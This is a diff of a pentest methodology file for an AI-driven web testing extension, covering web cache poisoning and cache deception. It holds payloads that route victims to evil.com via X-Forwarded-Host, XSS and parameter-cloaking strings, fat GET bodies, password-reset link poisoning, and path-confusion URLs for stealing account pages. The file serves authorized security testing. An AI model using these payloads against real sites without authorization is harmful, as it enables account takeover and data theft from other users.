@@ -1,234 +1,237 @@
----
-name: "cache"
-description: "Web Cache Poisoning and Cache Deception"
-version: "1.0.0"
-author: "void-extension"
-tags: ["pentest", "cache", "poisoning", "deception", "cdn", "unkeyed", "web-cache"]
-trigger_patterns:
-  - "/cache"
-  - "test cache poisoning"
-  - "test cache deception"
-  - "web cache"
-  - "cache attack"
-  - "unkeyed headers"
-  - "cache key"
----
-
-# Web Cache Poisoning and Cache Deception
-
-Test for web cache poisoning (injecting malicious content into cached responses
-via unkeyed inputs) and web cache deception (tricking the cache into storing
-sensitive responses under attacker-accessible URLs).
+# Web Cache Poisoning and Deception
 
 ## Scope and preconditions
 
 Applies to any application behind a caching layer: CDN (Cloudflare, Akamai,
-Fastly, CloudFront), reverse proxy (Varnish, nginx), or application-level cache.
+Fastly), reverse proxy (Varnish, Nginx), or application-level cache. Covers
+both cache poisoning (inject malicious content into cached responses) and cache
+deception (trick the cache into storing sensitive responses).
 
-Requires the ability to detect caching via response headers.
-
-It does **not** cover: DNS cache poisoning, browser cache attacks, or HTTP
-request smuggling (use `request-smuggling`).
+It does **not** cover: DNS cache poisoning, browser cache exploitation, or
+general header injection without caching impact.
 
 ## Rules of engagement
 
-- ALWAYS use a unique cache-buster parameter (`?void_cb=<random>`) on every
-  probe request to avoid poisoning real cached content.
-- NEVER poison a production cache without the cache-buster. Only remove it for
-  final confirmation on a path you control.
-- Record every poisoned response with `add_pentest_finding`.
-- In mode `ask`: confirm the cache stores your injected value and stop.
+- MUST use cache-buster parameters to isolate your tests from other users.
+  Always append `?cb=RANDOM` to avoid poisoning pages for real users.
+- MUST verify poisoning from a different IP/session before claiming success.
+- NEVER poison authentication or payment pages without explicit authorization.
+- MUST document the TTL and blast radius of any successful poisoning.
 
 ## Workflow
 
-- [ ] 1. Detect and fingerprint the cache
-- [ ] 2. Map the cache key
-- [ ] 3. Find unkeyed inputs (headers, cookies, query params)
-- [ ] 4. Test cache poisoning
-- [ ] 5. Test cache deception
-- [ ] 6. Verify and report
+- [ ] 1. Identify caching infrastructure
+- [ ] 2. Find unkeyed inputs
+- [ ] 3. Test cache poisoning
+- [ ] 4. Test cache deception
+- [ ] 5. Test fat GET attacks
+- [ ] 6. Test password reset poisoning
+- [ ] 7. Assess impact and record
 
-## Step 1: Detect the cache
+## Step 1: Identify caching infrastructure
 
-Use `send_request` to fetch a page twice. Check response headers:
-
-| Header | Meaning |
-|--------|---------|
-| `X-Cache: HIT` / `MISS` | Cache is active |
-| `Age: 30` | Response was cached 30 seconds ago |
-| `Cache-Control: max-age=300` | Cacheable for 5 minutes |
-| `CF-Cache-Status: HIT` | Cloudflare cache |
-| `X-Varnish: 123 456` | Varnish (two IDs = cache hit) |
-| `Via: 1.1 varnish` | Varnish in chain |
-| `X-Served-By` | CDN node identifier |
-| `Vary: Accept-Encoding` | Cache varies by this header |
-
-Use `compare_responses` between the first (MISS) and second (HIT) request. If
-`Age` increases or `X-Cache` changes from MISS to HIT, caching is confirmed.
-
-## Step 2: Map the cache key
-
-The cache key determines which requests share a cached response. Typically:
-`scheme + host + path + sorted query string`.
+### Goal
+Determine if responses are cached and by what.
 
 ### Actions
+Use `search_responses` and `send_request` to find cache indicators:
 
-1. Send a request with `?void_cb=1` — cache MISS.
-2. Repeat with `?void_cb=1` — should be HIT (query is keyed).
-3. Send with `?void_cb=2` — should be MISS (different key).
-4. Send the same URL with a different `Accept-Language` header — HIT or MISS?
-   If MISS, that header is keyed (check `Vary` header).
-5. Send with a different `Cookie` header — HIT or MISS? Cookies are often
-   excluded from the cache key even if they influence the response.
+| Header | Meaning |
+|---|---|
+| `X-Cache: HIT` / `MISS` | CDN/proxy cache status |
+| `Age: 300` | Response has been cached for 300 seconds |
+| `Via: 1.1 varnish` | Varnish proxy in the path |
+| `CF-Cache-Status: HIT` | Cloudflare cache |
+| `X-Served-By: cache-...` | Fastly cache |
+| `Cache-Control: max-age=3600` | Response cacheable for 1 hour |
+| `Vary: Accept-Encoding` | Cache varies by this header (important!) |
 
-### What is NOT in the cache key = attack surface
+Send the same request twice. If the second is faster and `Age` increases or
+`X-Cache` changes to `HIT`, the response is cached.
 
-Any input that changes the response but is NOT part of the cache key is an
-unkeyed input. You can inject your value, cache it, and serve it to other users.
+## Step 2: Find unkeyed inputs
 
-## Step 3: Find unkeyed inputs
+### Goal
+Identify headers and parameters that affect the response but are NOT part of
+the cache key.
 
-### Unkeyed headers
+### Technique
+The cache key typically includes: method, host, path, query string. Headers
+are usually NOT in the cache key. If a header changes the response but is not
+in the key, you can poison the cache.
 
-Send requests with each header below (one at a time) and a cache-buster. Check
-if the header value is reflected in the response:
+Test these unkeyed headers with `send_request`:
 
-| Header | Common reflection point |
-|--------|----------------------|
-| `X-Forwarded-Host: evil.com` | `<link>`, `<script src>`, `<meta>`, redirects |
-| `X-Forwarded-Scheme: http` | Forces redirect or changes asset URLs |
-| `X-Original-URL: /admin` | Path override (nginx/IIS) |
-| `X-Rewrite-URL: /admin` | Path override |
-| `X-Forwarded-Port: 1234` | Port reflected in URLs |
-| `X-Host: evil.com` | Alternative to X-Forwarded-Host |
-| `X-Forwarded-Prefix: /evil` | Prefix reflected in links |
-| `Transfer-Encoding: chunked` | May cause differential parsing |
+| Header | Effect to test |
+|---|---|
+| `X-Forwarded-Host` | Reflected in links, redirects, scripts |
+| `X-Forwarded-Scheme` | Changes HTTP/HTTPS in generated URLs |
+| `X-Forwarded-Proto` | Same as above |
+| `X-Original-URL` | Overrides the request path (IIS/Symfony) |
+| `X-Rewrite-URL` | Overrides path (IIS) |
+| `X-Forwarded-Port` | Changes port in generated URLs |
+| `X-Forwarded-Prefix` | Prepends prefix to generated URLs |
+| `X-Host` | Alternative Host header |
+| `Forwarded: host=evil.com` | RFC 7239 forwarded header |
+| `X-Forwarded-For` | May change response content (geo-based) |
 
-Use `compare_responses` between a request with and without each header. Any
-header that changes the response body but does NOT change the cache key is
-exploitable.
+For each: send the header, check if it changes the response, then send without
+the header and check if the cached (poisoned) response is served.
 
-### Unkeyed query parameters
+## Step 3: Test cache poisoning
 
-Some caches exclude specific parameters (UTM, analytics):
-`?utm_source=<script>alert(1)</script>`
+### Goal
+Inject malicious content that is served to other users from cache.
 
-If the parameter is reflected in the response and not part of the cache key,
-it's a poisoning vector.
+### Actions
+1. Find an unkeyed input that is reflected in the response (Step 2).
+2. Inject a payload via that input:
+   ```
+   X-Forwarded-Host: evil.com
+   ```
+   If the page generates `<script src="https://evil.com/js/app.js">`, the
+   cached page loads JavaScript from the attacker.
 
-### Parameter cloaking
+3. Use a cache-buster to test safely:
+   ```
+   GET /page?cb=test123
+   X-Forwarded-Host: evil.com
+   ```
 
-When the cache and the application parse query strings differently:
+4. Verify from a different session (no custom headers):
+   ```
+   GET /page?cb=test123
+   ```
+   If the poisoned response is returned — cache poisoning confirmed.
 
+### Import-based poisoning
 ```
-GET /page?param=valid%26utm_content=<script>alert(1)</script>
+X-Forwarded-Host: evil.com
+```
+If the page has `<link rel="stylesheet" href="https://evil.com/style.css">`,
+injected CSS executes on every page load for the TTL duration.
+
+### Meta redirect poisoning
+```
+X-Forwarded-Host: evil.com
+```
+If the page generates `<meta http-equiv="refresh" content="0;url=https://evil.com/">`,
+all users visiting the cached page are redirected.
+
+## Step 4: Test cache deception
+
+### Goal
+Trick the cache into storing authenticated responses as public.
+
+### Technique (distinct from poisoning)
+In cache deception, the attacker makes the **victim** visit a URL that:
+1. The application serves with the victim's private data (account page)
+2. The cache stores as a static resource
+
+**Path confusion**:
+```
+https://target.com/account/settings/nonexistent.css
+```
+- The application ignores the `.css` extension, serves the account page
+- The cache sees `.css`, treats it as a static resource, stores it
+- The attacker fetches the cached URL, reads the victim's data
+
+**Path normalization variants**:
+```
+/account%2fsettings          → app normalizes, cache doesn't
+/account/..%2fsettings       → path traversal + normalization diff
+/account/settings/           → trailing slash handling differs
+/account/settings;.css       → Tomcat path parameter
+/account/settings%00.css     → null byte
 ```
 
-The cache sees one parameter (keyed); the application decodes `%26` as `&` and
-sees two parameters, reflecting the injected one.
+### Detection
+Send a request for an authenticated page with a static-looking extension.
+If it returns private data AND is cached (check `X-Cache`, `Age`), cache
+deception works.
 
-Also try semicolon as separator:
+## Step 5: Fat GET attacks
+
+### Goal
+Exploit caches that ignore GET request bodies.
+
+### Technique
+Some applications process GET request bodies (against HTTP semantics):
 ```
-GET /page?param=valid;injected=<script>alert(1)</script>
+GET /api/user HTTP/1.1
+Content-Type: application/json
+
+{"admin": true}
 ```
+The cache ignores the body (it's a GET — no body expected), stores the response.
+The response reflects the body's influence. Other users get the cached response
+without sending the body.
 
-Ruby on Rails and some frameworks treat `;` as `&`.
+Test with `send_request`: send a GET with a body that changes the response.
 
-## Step 4: Cache poisoning
+## Step 6: Password reset poisoning
 
-### Attack flow
+### Goal
+Poison cached password reset pages to steal tokens.
 
-1. Find an unkeyed input that is reflected in the response.
-2. Send the request WITH the malicious value and WITHOUT the cache-buster.
-3. Repeat until the cache stores it (check `X-Cache: HIT`).
-4. Verify by fetching the URL from a clean session — the poisoned value appears.
-
-### Example: X-Forwarded-Host poisoning
-
+### Technique
 ```
-GET /page HTTP/1.1
+POST /forgot-password HTTP/1.1
 Host: target.com
 X-Forwarded-Host: evil.com
 
-Response:
-<script src="https://evil.com/assets/app.js"></script>
+email=victim@target.com
 ```
 
-If this response is cached, every subsequent visitor loads JavaScript from
-`evil.com` — stored XSS via cache.
+If the application generates reset links using `X-Forwarded-Host` AND the
+response is cached:
+1. The cached reset page sends all users' reset links to `evil.com`
+2. Any user requesting a password reset gets a link to the attacker's domain
 
-### Fat GET poisoning
+This is different from direct Host header ATO — here the cache amplifies the
+attack to ALL users, not just one victim.
 
-Some frameworks process a body on GET requests:
+## Step 7: Assess impact and record
 
-```
-GET /page HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
+### Impact ladder
 
-param=<script>alert(1)</script>
-```
+| Scenario | Severity |
+|---|---|
+| Unkeyed header reflected but not cached | Informational |
+| Cache poisoning with HTML injection | Medium |
+| Cache poisoning with JavaScript injection | High-Critical |
+| Cache deception leaking user data | High |
+| Password reset link poisoning via cache | Critical |
+| Cache poisoning on login/auth pages | Critical |
 
-The body is not part of the cache key, but the application uses the body value
-in the response.
+### Blast radius factors
+- **TTL**: How long does the poisoned response persist?
+- **Scope**: Does it affect one page or the entire site?
+- **CDN distribution**: Is the poison replicated to all CDN edge nodes?
+- **Cache key scope**: Does the poison affect all users or only a subset?
 
-## Step 5: Cache deception
-
-Trick the cache into storing a response containing sensitive data under a URL
-the attacker can access.
-
-### Path confusion technique
-
-If the cache decides cacheability by file extension:
-
-```
-GET /account/settings/nonexistent.css HTTP/1.1
-```
-
-- The application ignores `nonexistent.css` and serves `/account/settings` with
-  the victim's data.
-- The cache sees `.css` and caches the response.
-- The attacker fetches `/account/settings/nonexistent.css` and gets the victim's
-  account page.
-
-### Variations
-
-| Technique | URL |
-|-----------|-----|
-| Path append | `/account/settings/x.css` |
-| Encoded separator | `/account/settings%2fx.css` |
-| Semicolon | `/account/settings;x.css` |
-| Dot segment | `/account/settings/..%2f..%2faccount/settings/x.css` |
-| Null byte | `/account/settings%00.css` |
-
-### Detection
-
-1. Log in as victim, send the deception URL.
-2. From a clean session (no cookies), fetch the same URL.
-3. If you see the victim's data, cache deception works.
-
-Use `compare_responses` between the authenticated and unauthenticated fetch.
-
-## Severity reference
-
-| Finding | Severity |
-|---------|----------|
-| Cache poisoning → stored XSS (JavaScript injection) | Critical |
-| Cache poisoning → redirect to attacker (phishing) | High |
-| Cache deception → sensitive data exposure (PII, tokens) | High |
-| Cache poisoning → header injection (non-XSS) | Medium |
-| Unkeyed input reflected but no exploitable gadget | Low |
+Use `add_pentest_finding` with:
+- The unkeyed input used for poisoning
+- The poisoned response (showing injected content)
+- Verification from a clean session
+- TTL and blast radius assessment
 
 ## Known false positives
 
-- `X-Cache: HIT` does not prove the response was poisoned — it only proves
-  caching is active. You must show your injected content in the cached response.
-- A reflected header value in a non-rendered context (JSON API, non-HTML) may
-  not be exploitable for XSS. Assess the actual impact.
-- Cache deception returning generic content (not user-specific) is not a finding.
+- Header reflected in response but response not cached — no poisoning impact.
+  Check `X-Cache`, `Age`, `Cache-Control`.
+- Response cached but the injected content is harmless (reflected in a comment,
+  in a JSON field not rendered in HTML).
+- Cache deception where the response has `Cache-Control: no-store` — the CDN
+  should not cache it. Verify that it actually doesn't.
+- `X-Forwarded-Host` reflected in the response but the application already uses
+  its own domain in generated URLs — the reflection does not override.
 
-## Tooling note
+## Reminder
 
-This methodology is designed for the Void panel tools (`send_request`,
-`compare_responses`, `search_responses`, `get_endpoints`,
-`add_pentest_finding`). These are browser-extension APIs, not shell commands.
-Do not attempt to run CLI tools.
+Cache poisoning and deception are different attacks. **Poisoning**: attacker
+injects content into the cache, all users receive it. **Deception**: attacker
+tricks the cache into storing the victim's private response, attacker reads it.
+The highest-value test: find an unkeyed header that is reflected in a `<script>`
+src or `<link>` href — that is stored XSS via cache, affecting every visitor
+for the cache TTL duration.
